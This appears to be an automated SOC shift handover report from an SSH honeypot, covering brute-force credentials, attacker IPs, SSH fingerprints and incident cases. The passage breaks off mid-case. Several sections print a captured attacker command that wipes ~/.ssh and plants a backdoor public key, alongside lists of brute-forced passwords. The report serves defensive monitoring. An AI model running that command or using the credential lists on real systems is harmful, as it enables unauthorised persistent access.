# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-30 |
| **Generated At** | 2026-04-30T10:10:54Z |
| **Shift Time** | 10:10 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **349** |
| Confirmed Threats | **226** |
| False Positives Filtered | **123** (35.2%) |
| Unique Attacker IPs | **76** |
| Countries of Origin | **23** |
| High Severity Cases | **19** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **330** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **183** |
| Unique Credential Pairs | **91** |
| Unique Usernames | **45** |
| Unique Passwords | **85** |
| Successful Auth Pairs | **17** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `ubuntu` | 32 |
| `root` | 19 |
| `admin` | 15 |
| `345gs5662d34` | 9 |
| `test` | 8 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 9 |
| `3245gs5662d34` | 9 |
| `Pa55word` | 4 |
| `121212` | 4 |
| `12345678` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 9 |
| `root` | `3245gs5662d34` | 9 |
| `ubuntu` | `Pa55word` | 4 |
| `user5` | `password123` | 3 |
| `test` | `!QAZ2wsx#EDC.` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `steam` | `121.168.139.251` | 2026-04-30T06:53:15 |
| `root` | `3245gs5662d34` | `121.168.139.251` | 2026-04-30T06:53:18 |
| `root` | `admin654321` | `121.168.139.251` | 2026-04-30T06:59:13 |
| `root` | `admin00!` | `121.168.139.251` | 2026-04-30T07:12:54 |
| `root` | `server*123` | `139.59.112.10` | 2026-04-30T07:36:21 |
| `root` | `3245gs5662d34` | `139.59.112.10` | 2026-04-30T07:36:23 |
| `root` | `server*123` | `43.160.200.19` | 2026-04-30T07:36:29 |
| `root` | `3245gs5662d34` | `43.160.200.19` | 2026-04-30T07:36:32 |
| `root` | `server*123` | `103.210.21.225` | 2026-04-30T07:53:59 |
| `root` | `3245gs5662d34` | `103.210.21.225` | 2026-04-30T07:54:02 |
| `root` | `---fuck_you----` | `120.26.202.34` | 2026-04-30T08:10:40 |
| `root` | `Digitalocean123!` | `49.207.40.162` | 2026-04-30T08:54:11 |
| `root` | `3245gs5662d34` | `49.207.40.162` | 2026-04-30T08:54:13 |
| `root` | `server2` | `161.49.89.39` | 2026-04-30T09:05:51 |
| `root` | `3245gs5662d34` | `161.49.89.39` | 2026-04-30T09:05:54 |
| `root` | `Digitalocean123!` | `185.249.74.198` | 2026-04-30T09:11:08 |
| `root` | `3245gs5662d34` | `185.249.74.198` | 2026-04-30T09:11:11 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **349** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 207 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 148 | 7 |
| `03a80b21afa8...` | Modern SSH client | 50 | 5 |
| `98f63c4d9c87...` | Generic scanner | 1 | 1 |
| `2aec6b44b06b...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 148 | 7 | libssh-based |
| `03a80b21afa8...` | libssh | 50 | 5 | Modern SSH client |
| `95420f9d932d...` | libssh | 9 | 2 | — |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `2aec6b44b06b...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 9 | 7 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.210.21.225`, `121.168.139.251`, `43.160.200.19`, `185.249.74.198`, `139.59.112.10`, `49.207.40.162`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **76** |
| Unique ASNs | **59** |
| High-Risk ASNs | **18** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS14061` | DigitalOcean, LLC | 5 | HIGH |
| `AS24940` | Hetzner Online GmbH | 5 | LOW |
| `AS55836` | Reliance Jio Infocomm Limited | 4 | LOW |
| `AS51167` | Contabo GmbH | 2 | LOW |
| `AS24560` | Bharti Airtel Ltd., Telemedia Services | 2 | LOW |
| `AS8560` | IONOS SE | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (19)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-fc5fd2f66666

| Field | Detail |
|---|---|
| **Source IP** | `121.168.139[.]251` |
| **First Seen** | 2026-04-30 06:53 |
| **Last Seen** | 2026-04-30 06:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 06:53:14` | `cowrie.session.connect` |
| `2026-04-30 06:53:14` | `cowrie.client.version` |
| `2026-04-30 06:53:14` | `cowrie.client.kex` |
| `2026-04-30 06:53:15` | `cowrie.login.success` |
| `2026-04-30 06:53:15` | `cowrie.session.params` |
| `2026-04-30 06:53:15` | `cowrie.command.input` |
| `2026-04-30 06:53:15` | `cowrie.command.failed` |
| `2026-04-30 06:53:15` | `cowrie.log.closed` |
| `2026-04-30 06:53:15` | `cowrie.session.params` |
| `2026-04-30 06:53:15` | `cowrie.command.input` |
| `2026-04-30 06:53:16` | `cowrie.session.file_download` |
| `2026-04-30 06:53:16` | `cowrie.log.closed` |
| `2026-04-30 06:53:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.168.139[.]251` to AbuseIPDB if not already reported
- [ ] Block `121.168.139[.]251` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81f14f503516

| Field | Detail |
|---|---|
| **Source IP** | `121.168.139[.]251` |
| **First Seen** | 2026-04-30 06:53 |
| **Last Seen** | 2026-04-30 06:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 06:53:18` | `cowrie.session.connect` |
| `2026-04-30 06:53:18` | `cowrie.client.version` |
| `2026-04-30 06:53:18` | `cowrie.client.kex` |
| `2026-04-30 06:53:18` | `cowrie.login.success` |
| `2026-04-30 06:53:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.168.139[.]251` to AbuseIPDB if not already reported
- [ ] Block `121.168.139[.]251` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c067190eec7b

| Field | Detail |
|---|---|
| **Source IP** | `121.168.139[.]251` |
| **First Seen** | 2026-04-30 06:59 |
| **Last Seen** | 2026-04-30 06:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 06:59:12` | `cowrie.session.connect` |
| `2026-04-30 06:59:12` | `cowrie.client.version` |
| `2026-04-30 06:59:12` | `cowrie.client.kex` |
| `2026-04-30 06:59:13` | `cowrie.login.success` |
| `2026-04-30 06:59:13` | `cowrie.session.params` |
| `2026-04-30 06:59:13` | `cowrie.command.input` |
| `2026-04-30 06:59:13` | `cowrie.command.failed` |
| `2026-04-30 06:59:13` | `cowrie.log.closed` |
| `2026-04-30 06:59:14` | `cowrie.session.params` |
| `2026-04-30 06:59:14` | `cowrie.command.input` |
| `2026-04-30 06:59:14` | `cowrie.session.file_download` |
| `2026-04-30 06:59:14` | `cowrie.log.closed` |
| `2026-04-30 06:59:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.168.139[.]251` to AbuseIPDB if not already reported
- [ ] Block `121.168.139[.]251` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fc4d2344728

| Field | Detail |
|---|---|
| **Source IP** | `121.168.139[.]251` |
| **First Seen** | 2026-04-30 06:59 |
| **Last Seen** | 2026-04-30 06:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 06:59:16` | `cowrie.session.connect` |
| `2026-04-30 06:59:16` | `cowrie.client.version` |
| `2026-04-30 06:59:16` | `cowrie.client.kex` |
| `2026-04-30 06:59:16` | `cowrie.login.success` |
| `2026-04-30 06:59:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.168.139[.]251` to AbuseIPDB if not already reported
- [ ] Block `121.168.139[.]251` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1304d67c8fa0

| Field | Detail |
|---|---|
| **Source IP** | `121.168.139[.]251` |
| **First Seen** | 2026-04-30 07:12 |
| **Last Seen** | 2026-04-30 07:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 07:12:53` | `cowrie.session.connect` |
| `2026-04-30 07:12:53` | `cowrie.client.version` |
| `2026-04-30 07:12:53` | `cowrie.client.kex` |
| `2026-04-30 07:12:54` | `cowrie.login.success` |
| `2026-04-30 07:12:54` | `cowrie.session.params` |
| `2026-04-30 07:12:54` | `cowrie.command.input` |
| `2026-04-30 07:12:54` | `cowrie.command.failed` |
| `2026-04-30 07:12:54` | `cowrie.log.closed` |
| `2026-04-30 07:12:55` | `cowrie.session.params` |
| `2026-04-30 07:12:55` | `cowrie.command.input` |
| `2026-04-30 07:12:55` | `cowrie.session.file_download` |
| `2026-04-30 07:12:55` | `cowrie.log.closed` |
| `2026-04-30 07:12:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.168.139[.]251` to AbuseIPDB if not already reported
- [ ] Block `121.168.139[.]251` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89567a96fe80

| Field | Detail |
|---|---|
| **Source IP** | `121.168.139[.]251` |
| **First Seen** | 2026-04-30 07:12 |
| **Last Seen** | 2026-04-30 07:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 07:12:57` | `cowrie.session.connect` |
| `2026-04-30 07:12:57` | `cowrie.client.version` |
| `2026-04-30 07:12:57` | `cowrie.client.kex` |
| `2026-04-30 07:12:57` | `cowrie.login.success` |
| `2026-04-30 07:12:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.168.139[.]251` to AbuseIPDB if not already reported
- [ ] Block `121.168.139[.]251` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a0d154cf2c3

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-04-30 07:36 |
| **Last Seen** | 2026-04-30 07:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 07:36:21` | `cowrie.session.connect` |
| `2026-04-30 07:36:21` | `cowrie.client.version` |
| `2026-04-30 07:36:21` | `cowrie.client.kex` |
| `2026-04-30 07:36:21` | `cowrie.login.success` |
| `2026-04-30 07:36:21` | `cowrie.session.params` |
| `2026-04-30 07:36:21` | `cowrie.command.input` |
| `2026-04-30 07:36:21` | `cowrie.command.failed` |
| `2026-04-30 07:36:21` | `cowrie.log.closed` |
| `2026-04-30 07:36:21` | `cowrie.session.params` |
| `2026-04-30 07:36:21` | `cowrie.command.input` |
| `2026-04-30 07:36:21` | `cowrie.session.file_download` |
| `2026-04-30 07:36:21` | `cowrie.log.closed` |
| `2026-04-30 07:36:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58eddd6c370f

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-04-30 07:36 |
| **Last Seen** | 2026-04-30 07:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 07:36:23` | `cowrie.session.connect` |
| `2026-04-30 07:36:23` | `cowrie.client.version` |
| `2026-04-30 07:36:23` | `cowrie.client.kex` |
| `2026-04-30 07:36:23` | `cowrie.login.success` |
| `2026-04-30 07:36:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c917ad4690bd

| Field | Detail |
|---|---|
| **Source IP** | `43.160.200[.]19` |
| **First Seen** | 2026-04-30 07:36 |
| **Last Seen** | 2026-04-30 07:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 07:36:29` | `cowrie.session.connect` |
| `2026-04-30 07:36:29` | `cowrie.client.version` |
| `2026-04-30 07:36:29` | `cowrie.client.kex` |
| `2026-04-30 07:36:29` | `cowrie.login.success` |
| `2026-04-30 07:36:30` | `cowrie.session.params` |
| `2026-04-30 07:36:30` | `cowrie.command.input` |
| `2026-04-30 07:36:30` | `cowrie.command.failed` |
| `2026-04-30 07:36:30` | `cowrie.log.closed` |
| `2026-04-30 07:36:30` | `cowrie.session.params` |
| `2026-04-30 07:36:30` | `cowrie.command.input` |
| `2026-04-30 07:36:30` | `cowrie.session.file_download` |
| `2026-04-30 07:36:30` | `cowrie.log.closed` |
| `2026-04-30 07:36:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.160.200[.]19` to AbuseIPDB if not already reported
- [ ] Block `43.160.200[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bad16497e787

| Field | Detail |
|---|---|
| **Source IP** | `43.160.200[.]19` |
| **First Seen** | 2026-04-30 07:36 |
| **Last Seen** | 2026-04-30 07:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 07:36:31` | `cowrie.session.connect` |
| `2026-04-30 07:36:31` | `cowrie.client.version` |
| `2026-04-30 07:36:32` | `cowrie.client.kex` |
| `2026-04-30 07:36:32` | `cowrie.login.success` |
| `2026-04-30 07:36:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.160.200[.]19` to AbuseIPDB if not already reported
- [ ] Block `43.160.200[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e4210bea509

| Field | Detail |
|---|---|
| **Source IP** | `103.210.21[.]225` |
| **First Seen** | 2026-04-30 07:53 |
| **Last Seen** | 2026-04-30 07:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 07:53:58` | `cowrie.session.connect` |
| `2026-04-30 07:53:58` | `cowrie.client.version` |
| `2026-04-30 07:53:58` | `cowrie.client.kex` |
| `2026-04-30 07:53:59` | `cowrie.login.success` |
| `2026-04-30 07:53:59` | `cowrie.session.params` |
| `2026-04-30 07:53:59` | `cowrie.command.input` |
| `2026-04-30 07:53:59` | `cowrie.command.failed` |
| `2026-04-30 07:53:59` | `cowrie.log.closed` |
| `2026-04-30 07:53:59` | `cowrie.session.params` |
| `2026-04-30 07:53:59` | `cowrie.command.input` |
| `2026-04-30 07:54:00` | `cowrie.session.file_download` |
| `2026-04-30 07:54:00` | `cowrie.log.closed` |
| `2026-04-30 07:54:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.210.21[.]225` to AbuseIPDB if not already reported
- [ ] Block `103.210.21[.]225` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ef3561b02db

| Field | Detail |
|---|---|
| **Source IP** | `103.210.21[.]225` |
| **First Seen** | 2026-04-30 07:54 |
| **Last Seen** | 2026-04-30 07:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 07:54:01` | `cowrie.session.connect` |
| `2026-04-30 07:54:01` | `cowrie.client.version` |
| `2026-04-30 07:54:01` | `cowrie.client.kex` |
| `2026-04-30 07:54:02` | `cowrie.login.success` |
| `2026-04-30 07:54:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.210.21[.]225` to AbuseIPDB if not already reported
- [ ] Block `103.210.21[.]225` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fae6b23cecf

| Field | Detail |
|---|---|
| **Source IP** | `120.26.202[.]34` |
| **First Seen** | 2026-04-30 08:10 |
| **Last Seen** | 2026-04-30 08:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 08:10:35` | `cowrie.session.connect` |
| `2026-04-30 08:10:36` | `cowrie.client.version` |
| `2026-04-30 08:10:36` | `cowrie.client.kex` |
| `2026-04-30 08:10:40` | `cowrie.login.success` |
| `2026-04-30 08:10:42` | `cowrie.session.params` |
| `2026-04-30 08:10:42` | `cowrie.command.input` |
| `2026-04-30 08:10:44` | `cowrie.log.closed` |
| `2026-04-30 08:10:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.26.202[.]34` to AbuseIPDB if not already reported
- [ ] Block `120.26.202[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f8b8320682d

| Field | Detail |
|---|---|
| **Source IP** | `49.207.40[.]162` |
| **First Seen** | 2026-04-30 08:54 |
| **Last Seen** | 2026-04-30 08:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
